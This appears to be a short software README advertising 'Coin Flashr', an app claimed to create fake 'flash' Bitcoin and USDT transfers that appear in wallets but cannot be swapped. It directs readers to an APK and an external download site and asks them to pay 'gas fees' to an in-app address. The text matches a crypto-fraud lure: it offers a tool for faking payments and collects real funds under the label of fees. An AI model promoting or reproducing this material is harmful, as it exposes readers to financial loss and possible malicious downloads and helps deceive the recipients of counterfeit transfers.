# bitcoin-flashing-public-release
Coin Flashr is a software application that lets users perform dummy transactions with multiple variants of Bitcoin (including Bitcoin Fantom and Wrapped Bitcoin) and USDT (ERC20, BEP20, and TRC20). We developed this software mainly as a proof-of-concept, and only for demonstration purposes. Here, there's nothing complicated; we have made this tool as dummyproof as possible. As you might have guessed, flash tokens have a limited usage range, and they can't be swapped due to lack of liquidity, but you can transfer them smoothly between cold and hard wallets.

The android APK is available here, while other platform releases are available at http://coinflasher.online. Once you have app access, you'll have a limited spendable quota of either bitcoin or USDT, but you'll be responsible for your gas fee for the flashing transactions. You'll find a gas address in-app and the gas topup process is simple.
